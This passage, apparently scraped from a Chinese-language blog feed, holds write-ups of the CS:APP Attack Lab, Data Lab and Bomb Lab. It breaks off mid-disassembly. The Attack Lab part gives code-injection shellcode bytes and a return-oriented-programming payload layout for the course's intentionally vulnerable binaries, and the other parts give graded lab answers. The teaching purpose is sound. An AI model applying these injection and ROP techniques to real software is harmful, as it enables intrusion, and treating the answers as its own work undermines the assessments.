0d 05 00 00       callq  401d4f &lt;fail&gt;</span><br><span class="line">  401842:bf 00 00 00 00       mov    $0x0,%edi</span><br><span class="line">  401847:e8 f4 f5 ff ff       callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>查看两个printf的参数，分别输出如下</p><p><img src="https://i.loli.net/2021/07/18/iLu5wCNo9Dnk4fZ.png" alt=""></p><p>那么即我们得让传入的参数和cookie相等，再跳转到touch2</p><p><img src="https://i.loli.net/2021/07/18/7yZxrT24QwUn8K9.png" alt=""></p><p>经过调试发现我们rsp的地址是mmap出来的一块具有RWX权限的地址，那么这下就很简单了，直接能够执行代码了属于是，那👴🏻直接写汇编进去，再做一次ret</p><p>使用pwntools的命令行工具来生成汇编代码的二进制形式</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pwn asm  <span class="string">&#x27;mov rdi,0x59b997fa; ret&#x27;</span>  -c amd64 -c little</span><br><span class="line">48c7c7fa97b959c3</span><br></pre></td></tr></table></figure><p>验证一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pwn disasm 48c7c7fa97b959c3 -c amd64</span><br><span class="line">   0:    48 c7 c7 fa 97 b9 59     mov    rdi,  0x59b997fa</span><br><span class="line">   7:    c3                       ret</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/18/63tK5rOUPTQs9uC.png" alt=""></p><p>这。。。应该是成功了吧，毕竟没有Misfile，不知道下面的FAIL啥意思</p><h2 id="touch3"><a href="#touch3" class="headerlink" title="touch3"></a>touch3</h2><p>ida反编译出来的hexmatch函数是什么玩意，看的一头雾水，参考了一下wp，发现不同大佬的wp中都直接有源码（从哪搞的。。）</p><p><img src="https://i.loli.net/2021/07/18/btuhGr1vaXEzqsQ.png" alt=""></p><p>那就是比较字符串是否相同呗，传个地址进入，这个地址需要指向cookie</p><p>就多绕了个弯，和touch2差不多</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pwn asm  <span class="string">&#x27;mov rdi,0x5561dcb0;push 0x4018fa;ret&#x27;</span>  -c amd64 -c little</span><br><span class="line">48c7c7b0dc615568fa184000c3</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/18/HczPui42NJO63jB.png" alt=""></p><h2 id="rop2"><a href="#rop2" class="headerlink" title="rop2"></a>rop2</h2><p>rop系列栈无法执行，那么就用我们熟悉的rop来搞</p><p>首先是touch2（touch1跟之前那个没啥不一样的）</p><p>直接ROPgadget一把梭</p><p><img src="https://i.loli.net/2021/07/18/LHjT5YSAfP6hsla.png" alt=""></p><p>payload就是<code>pop_rdi_ret + cookie + touch2_address</code></p><p><img src="https://i.loli.net/2021/07/18/9djsK5fhUkGD8JS.png" alt=""></p><h2 id="rop3"><a href="#rop3" class="headerlink" title="rop3"></a>rop3</h2><p>卡住了，算偏移的时候算错了QAQ，大体思路采用一个大佬的图片</p><p><img src="https://i.loli.net/2021/07/18/RlG8pJHzBh1N72C.png" alt=""></p><p>其中add_xy是farm里自带的函数，在rtarget中含有</p><p><img src="https://i.loli.net/2021/07/18/hHrwgfzcTMeoy6O.png" alt=""></p><h1 id="总结反馈"><a href="#总结反馈" class="headerlink" title="总结反馈"></a>总结反馈</h1><ol><li>gdb调试带参数文件，set args -q，其中”-q”为参数</li><li>objdump 配合 nm 反汇编出某个指定函数</li><li>pwn asm 命令行工具生成二进制汇编数据，其中-c指定形式，默认linux/i386</li><li>二进制数据可以用管道符来输入到文件</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> csapp </tag>
            
            <tag> cmu lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DataLab</title>
      <link href="2021/07/10/DataLab/"/>
      <url>2021/07/10/DataLab/</url>
      
        <content type="html"><![CDATA[<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h2><p>思路比较简单，即使用~和&amp;实现异或<br>异或即相同为0不同为1<br>Y = ~AB + ~BA即可实现<br>然后把或通过德摩根律变成与即可实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * bitXor - x^y using only ~ and &amp; </span></span><br><span class="line"><span class="comment"> *   Example: bitXor(4, 5) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp;</span></span><br><span class="line"><span class="comment"> *   Max ops: 14</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(~(~x &amp; y) &amp; ~(x &amp; ~y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h2><p>补码的最小二进制数就是最高位1其余为0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h2><p>因为返回值只有0和1，所以考虑最后肯定是使用!运算符来实现<br>然后考虑最大数独有的特点，即0x7fffffff + 1 = 0x80000000 = -2147483648<br>所以 0x80000000 + 0x7fffffff = -1<br>所以 0x80000000 + 0x7fffffff + 1 = -1 + 1 = 0<br>所以 !(0x80000000 + 0x7fffffff + 1) = !(-1 + 1) = 1<br>综上即 !((x + 1) + x + 1)<br>这个式子看着就很诡异，只有边界值才满足，但是少考虑了最小边界值0和-1的情况（出错后才意识到），所以加个和0x7fffffff相与的操作即可避免0xffffffff的情况</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !(((x + <span class="number">1</span>) + (x &amp; <span class="number">0x7fffffff</span>)) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h2><p>奇数位全为1才能是1，那么0x0 - 0xF 中，只有0xA, 0xB, 0xE, 0xF才满足，即这个数字最小的是0xAAAAAAAA，那么无论这个数是多少，只要满足这个条件，其与0xAAAAAAAA相与后，偶数位一定为0（AH = 1010B），所以如果设这个数满足要求，则与0xAAAAAAAA与运算后，其值一定是0xAAAAAAAA，那么再与0xAAAAAAAA异或后，其值一定为0，取反则为1；反之，不满足要求，其值为0。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// a b e f</span></span><br><span class="line">  <span class="keyword">return</span> !((x &amp; <span class="number">0xAAAAAAAA</span>) ^ <span class="number">0xAAAAAAAA</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><p>无论从二进制数上推还是凭感觉硬试，都挺简单的，以8位来举个例子</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5:  00000101</span><br><span class="line">-5: 11111011</span><br></pre></td></tr></table></figure><p>无论正数还是负数都等于原来的取反 + 1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h2><p>思路大体上分为两部分<br>第一个是前28位，必须是0x3，异或判断即可<br>第二个是后4位，逻辑如下（或的思维）：<br>要么最高位是0（范围锁定在0x0 - 0x7）<br>要么第二三位是0（范围锁定在0x8 - 0x9）<br>然后用!运算的思维相与即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (!((x &gt;&gt; <span class="number">4</span>) ^ <span class="number">0x3</span>)) &amp; (!((x &lt;&lt; <span class="number">28</span>) &gt;&gt; <span class="number">31</span>) | !((x &lt;&lt; <span class="number">29</span>) &gt;&gt; <span class="number">30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h2><p>实现一个x ? y : z 条件运算符</p><p>逻辑是，如果x不为0则返回y，否则z</p><p>那么可以用异或来做，思路初步是这样的，因为x是不确定的数，但是在逻辑中只有0和非0，所以我们可以采用两次!!操作符让他变成非0和0的两个仅有的情况(0x00000000和0x00000001)</p><p>使用<code>~x + 1</code>可以让两种情况分别为0x00000000和0xffffffff，然后再用异或处理即可</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((~(!!x) + <span class="number">1</span>) &amp; y) ^ ((~(!x) + <span class="number">1</span>) &amp; z);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h2><h1 id="反馈总结"><a href="#反馈总结" class="headerlink" title="反馈总结"></a>反馈总结</h1><ol><li>判断在某个区间擅用异或操作</li><li>以二进制的角度看待问题</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> csapp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bomb Lab</title>
      <link href="2021/06/15/BombLab/"/>
      <url>2021/06/15/BombLab/</url>
      
        <content type="html"><![CDATA[<p>实验说明：</p><blockquote><p>A “binary bomb” is a program provided to students as an object code file. When run, it prompts the user to type in 6 different strings. If any of these is incorrect, the bomb “explodes,” printing an error message and logging the event on a grading server. Students must “defuse” their own unique bomb by disassembling and reverse engineering the program to determine what the 6 strings should be. The lab teaches students to understand assembly language, and also forces them to learn how to use a debugger. It’s also great fun. A legendary lab among the CMU undergrads.</p></blockquote><p>是个逆向的小游戏，我们使用gdb来做</p><p>反汇编一下main函数，可以大概看到有很多的phase，我们需要逐个拆除<br><img src="https://i.loli.net/2021/06/15/QzuaNr1OUdfVMqw.png" alt=""></p><h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p><img src="https://i.loli.net/2021/06/15/aiNtKRXkTMzxuAY.png" alt=""><br>反汇编可以看到在phase_1里面调用了一个strings_not_equal的函数，猜测如果两个字符串不相等就会爆炸，x64下程序通过rsi传入第二个参数，我们看一下具体的内存值即可。<br><img src="https://i.loli.net/2021/06/15/oKE52W9rqa6IjAR.png" alt=""></p><p>运行程序，发现可以不被引爆</p><h2 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h2><p>反汇编phase_2<br><img src="https://i.loli.net/2021/06/15/5UmbPSIHk1XFpd9.png" alt=""></p><p>可以看到后面有个jne指令向上跳转，所以肯定是个循环结构，在上面是个read_six_numbers，读入6个数字，所以猜测对每个数字都有要求，并且通过动调可以发现cmp那条指令要求第一个数字为1</p><p><img src="https://i.loli.net/2021/06/15/BHQwntopNq5by4S.png" alt=""><br>读入六个数字，否则就退出程序</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400f1a</span> &lt;+<span class="number">30</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0000000000400f1c</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>],<span class="built_in">eax</span></span><br></pre></td></tr></table></figure><p>这个位置动态调试可以发现是后面的数据是否等于前面数字的二倍</p><p>那么payload应该就是1 2 4 8 16 32了<br>可以通过验证</p><h2 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h2><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400f43</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"> <span class="number">0x0000000000400f47</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rcx</span>,[<span class="built_in">rsp</span>+<span class="number">0xc</span>]</span><br><span class="line"> <span class="number">0x0000000000400f4c</span> &lt;+<span class="number">9</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rdx</span>,[<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line"> <span class="number">0x0000000000400f51</span> &lt;+<span class="number">14</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x4025cf</span></span><br><span class="line"> <span class="number">0x0000000000400f56</span> &lt;+<span class="number">19</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"> <span class="number">0x0000000000400f5b</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line"> <span class="number">0x0000000000400f60</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line"> # 读入数据要是<span class="number">2</span>个</span><br><span class="line"> <span class="number">0x0000000000400f63</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">jg</span>     <span class="number">0x400f6a</span> &lt;phase_3+<span class="number">39</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f65</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">0x0000000000400f6a</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>],<span class="number">0x7</span></span><br><span class="line"> # 第一个读入的数据不能超过<span class="number">7</span></span><br><span class="line"> <span class="number">0x0000000000400f6f</span> &lt;+<span class="number">44</span>&gt;:<span class="keyword">ja</span>     <span class="number">0x400fad</span> &lt;phase_3+<span class="number">106</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f71</span> &lt;+<span class="number">46</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line"> <span class="number">0x0000000000400f75</span> &lt;+<span class="number">50</span>&gt;:<span class="keyword">jmp</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>*<span class="number">8</span></span><br><span class="line"> +<span class="number">0x402470</span>]</span><br><span class="line"> # 寻址到不同的分支</span><br><span class="line"> <span class="number">0x0000000000400f7c</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0xcf</span></span><br><span class="line"> <span class="number">0x0000000000400f81</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f83</span> &lt;+<span class="number">64</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x2c3</span></span><br><span class="line"> <span class="number">0x0000000000400f88</span> &lt;+<span class="number">69</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f8a</span> &lt;+<span class="number">71</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x100</span></span><br><span class="line"> <span class="number">0x0000000000400f8f</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f91</span> &lt;+<span class="number">78</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x185</span></span><br><span class="line"> <span class="number">0x0000000000400f96</span> &lt;+<span class="number">83</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f98</span> &lt;+<span class="number">85</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0xce</span></span><br><span class="line"> <span class="number">0x0000000000400f9d</span> &lt;+<span class="number">90</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400f9f</span> &lt;+<span class="number">92</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x2aa</span></span><br><span class="line"> <span class="number">0x0000000000400fa4</span> &lt;+<span class="number">97</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fa6</span> &lt;+<span class="number">99</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x147</span></span><br><span class="line"> <span class="number">0x0000000000400fab</span> &lt;+<span class="number">104</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fad</span> &lt;+<span class="number">106</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">0x0000000000400fb2</span> &lt;+<span class="number">111</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"> <span class="number">0x0000000000400fb7</span> &lt;+<span class="number">116</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x400fbe</span> &lt;phase_3+<span class="number">123</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fb9</span> &lt;+<span class="number">118</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x137</span></span><br><span class="line"> <span class="number">0x0000000000400fbe</span> &lt;+<span class="number">123</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0xc</span>]</span><br><span class="line"> <span class="number">0x0000000000400fc2</span> &lt;+<span class="number">127</span>&gt;:<span class="keyword">je</span>     <span class="number">0x400fc9</span> &lt;phase_3+<span class="number">134</span>&gt;</span><br><span class="line"> <span class="number">0x0000000000400fc4</span> &lt;+<span class="number">129</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"> <span class="number">0x0000000000400fc9</span> &lt;+<span class="number">134</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"> <span class="number">0x0000000000400fcd</span> &lt;+<span class="number">138</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure><p>目测看起来像个Switch结构，关键点给出注释，中间通过读入的数字到eax里面进行寻址<br>比如我要输入的第一个数字是7，那么查看地址如下<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/wx <span class="number">0x4024a8</span></span><br><span class="line"><span class="number">0x4024a8</span>:<span class="number">0x00400fa6</span></span><br></pre></td></tr></table></figure><br>可以发现会执行<code>mov eax,0x147</code>，然后jmp到cmp指令，将sscanf读入的第二个参数和该参数相比较，那么第二个我们输入0x147即可通过验证</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That&#x27;s number 2.  Keep going!</span><br><span class="line">7 327</span><br><span class="line">Halfway there!</span><br></pre></td></tr></table></figure><p>这是截止到目前的程序输出</p><h2 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h2><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">   <span class="number">0x000000000040100c</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x0000000000401010</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rcx</span>,[<span class="built_in">rsp</span>+<span class="number">0xc</span>]</span><br><span class="line">   <span class="number">0x0000000000401015</span> &lt;+<span class="number">9</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rdx</span>,[<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x000000000040101a</span> &lt;+<span class="number">14</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x4025cf</span></span><br><span class="line">   <span class="number">0x000000000040101f</span> &lt;+<span class="number">19</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401024</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400bf0</span> &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   <span class="number">0x0000000000401029</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x2</span></span><br><span class="line">   <span class="number">0x000000000040102c</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401035</span> &lt;phase_4+<span class="number">41</span>&gt;</span><br><span class="line">   <span class="number">0x000000000040102e</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>],<span class="number">0xe</span></span><br><span class="line">   # 第一个参数需要小于<span class="number">0xe</span></span><br><span class="line">   <span class="number">0x0000000000401033</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">jbe</span>    <span class="number">0x40103a</span> &lt;phase_4+<span class="number">46</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401035</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x000000000040103a</span> &lt;+<span class="number">46</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0xe</span></span><br><span class="line">   <span class="number">0x000000000040103f</span> &lt;+<span class="number">51</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401044</span> &lt;+<span class="number">56</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edi</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x0000000000401048</span> &lt;+<span class="number">60</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line">   # 调用func4函数继续处理，第一个参数为我们输入的第一个值，第二个参数是<span class="number">0</span>，第三个参数是<span class="number">0xe</span></span><br><span class="line">   <span class="number">0x000000000040104d</span> &lt;+<span class="number">65</span>&gt;:<span class="keyword">test</span>   <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x000000000040104f</span> &lt;+<span class="number">67</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401058</span> &lt;phase_4+<span class="number">76</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401051</span> &lt;+<span class="number">69</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0xc</span>],<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401056</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">je</span>     <span class="number">0x40105d</span> &lt;phase_4+<span class="number">81</span>&gt;</span><br><span class="line">   # 返回值和第二个参数都必须为<span class="number">0</span></span><br><span class="line">   <span class="number">0x0000000000401058</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x000000000040105d</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x0000000000401061</span> &lt;+<span class="number">85</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure><p>可以看到还是常规的首先比较参数个数，需要两个，并且第一个参数需要不能大于0xe</p><p>func4函数如下<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000400fce</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x0000000000400fd2</span> &lt;+<span class="number">4</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line"> # <span class="number">0xe</span></span><br><span class="line"><span class="number">0x0000000000400fd4</span> &lt;+<span class="number">6</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">eax</span>,<span class="built_in">esi</span></span><br><span class="line"><span class="number">0x0000000000400fd6</span> &lt;+<span class="number">8</span>&gt;:<span 